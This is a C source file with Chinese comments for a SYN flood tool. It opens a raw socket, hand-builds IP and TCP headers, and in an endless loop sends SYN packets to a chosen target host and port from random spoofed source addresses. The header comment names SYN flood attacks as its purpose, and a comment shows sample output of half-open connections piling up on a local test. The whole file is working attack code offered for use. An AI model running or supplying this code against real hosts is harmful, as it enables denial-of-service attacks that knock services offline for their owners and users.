/*
 *
 * Authored by Liu Peng on: Thu Apr 23 10:26:11 CST 2015
 *
 * @desc: 使用原始套接字 socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
 * 	  发送协议为TCP的ip报文， 可以发送SYN进行SYN flood攻击 端口嗅探
 *
 * @func:
**/
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/tcp.h>
#include "mdos.h"

int socket_init();
void main_loop(int sk, struct sockaddr_in *target, unsigned short srcport);
unsigned short check_sum(unsigned short *addr, int len);

int main(int argc, char **argv)
{
	int sock_fd;
	struct sockaddr_in target;
	struct hostent *host;
	unsigned short srcport;

	if (argc != 4) {
		DEBUG("need more param!\nUsage:%s target dstport srcport\n", argv[0]);
		exit(1);
	}

	bzero(&target, sizeof(struct sockaddr_in));
	target.sin_family	= AF_INET;
	target.sin_port		= htons(atoi(argv[2]));

	if (inet_aton(argv[1], &target.sin_addr) == 0) {
		host	= gethostbyname(argv[1]);
		if (host == NULL) {
			ERROR("TargetName Error\n");
			exit(2);
		}
		target.sin_addr	= *(struct in_addr *)(host->h_addr_list[0]);
	}
	
	if (0 > (sock_fd = socket_init())) {
		DEBUG("socket_init faild\n");	
		exit(3);
	}

	// 原始套接字需要root权限
	setuid(getpid());
	srcport	= atoi(argv[3]);

	main_loop(sock_fd, &target, srcport);	

	return 0;
}

int socket_init()
{
	int sk = -1;
	const int on = 1;

	// 创建一个TCP的原始套接字
	if (0 > (sk = socket(AF_INET, SOCK_RAW, IPPROTO_TCP))) {
		ERROR("socket create faild");
		return -1;
	}

	// 开启IP_HDRINCL特性， 由此程序手动构造IP首部
	if (0 > setsockopt(sk, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on))) {
		ERROR("set socket IP_HDRINCL faild");
		return -1;
	}

	DEBUG("sock %d\n", sk);
	return sk;
}

void main_loop(int sk, struct sockaddr_in *target, unsigned short srcport)
{
	char buf[128]	= {0};
	char check_sum_buf[256] = {0};
	struct ip *ip;
	struct tcphdr *tcp;
	struct psd_header *ph_tcp; // tcp 伪首部
	int ip_len;

	// 我们的tcp报文中没有Data字段， 所以ip报文长度如下
	ip_len	= sizeof(struct ip) + sizeof(struct tcphdr);
	ip	= (struct ip *)buf;
	tcp	= (struct tcphdr *)(buf + sizeof(struct ip));
	ph_tcp	= (struct psd_header *)check_sum_buf;

	// 填充IP首部
	ip->ip_v	= IPVERSION;
	ip->ip_hl	= sizeof(struct ip) >> 2;
	ip->ip_tos	= 0;
	ip->ip_len	= htons(ip_len);
	ip->ip_id	= 0;
	ip->ip_off	= 0;
	ip->ip_ttl	= MAXTTL;
	ip->ip_p	= IPPROTO_TCP;
	ip->ip_sum	= 0;
	ip->ip_dst	= target->sin_addr;

	// 填充TCP首部
	tcp->source	= htons(srcport);
	tcp->dest	= target->sin_port;
	tcp->seq	= random();
	tcp->ack_seq	= 0;
	tcp->doff	= 5;
	tcp->syn	= 1;
	tcp->urg_ptr	= 0;
	tcp->window	= htons(10052);

	// 填充TCP伪首部
	ph_tcp->daddr	= target->sin_addr.s_addr;
	ph_tcp->mbz	= 0;
	ph_tcp->ptcl	= IPPROTO_TCP;
	ph_tcp->tcpl	= htons(sizeof(struct tcphdr));

	/* 通过伪造源地址填充ip->ip_src字段, 向对端发送大量的SYN报文
	 * 程序运行一端时间后的结果
	 * sudo mydos 127.0.0.1 8080 8888
	 * netstat -an | grep 8888
	 * tcp        0      0 127.0.0.1:8080          238.233.208.106:8888    SYN_RECV
	 * tcp        0      0 127.0.0.1:8080          233.208.5.44:8888       SYN_RECV
	 * tcp        0      0 127.0.0.1:8080          231.59.130.90:8888      SYN_RECV
	 * tcp        0      0 127.0.0.1:8080          228.6.170.108:8888      SYN_RECV
	 * tcp        0      0 127.0.0.1:8080          225.0.207.60:8888       SYN_RECV
	 * tcp        0      0 127.0.0.1:8080          228.0.216.40:8888       SYN_RECV
	 * tcp        0      0 127.0.0.1:8080          233.244.194.42:8888     SYN_RECV
	 */
	while (1) {
		ip->ip_src.s_addr	= random(); // 伪造原地址
		ph_tcp->saddr		= ip->ip_src.s_addr;
		memcpy(check_sum_buf + sizeof(struct psd_header), tcp, sizeof(struct tcphdr)); 
		tcp->check	= check_sum((unsigned short *)check_sum_buf, 
					sizeof(struct psd_header) + sizeof(struct tcphdr));
		sendto(sk, buf, ip_len, 0, (struct sockaddr *)target, sizeof(struct sockaddr_in));
		
	}
}

// 校验和
unsigned short check_sum(unsigned short *addr, int len)
{
	register int nleft = len;
	register int sum = 0;
	register unsigned short *w = addr;
	short answer = 0;
	
	while (nleft > 1) {
	        sum	+= *w++;
	        nleft	-= 2;
	}

	if (nleft == 1) {
	        *(unsigned char *)(&answer)	= *(unsigned char *)w;
	        sum	+=answer;
	}
	
	sum	= (sum >> 16) + (sum & 0xffff);
	sum	+= (sum >> 16);
	answer	= ~sum;
	return answer;
}
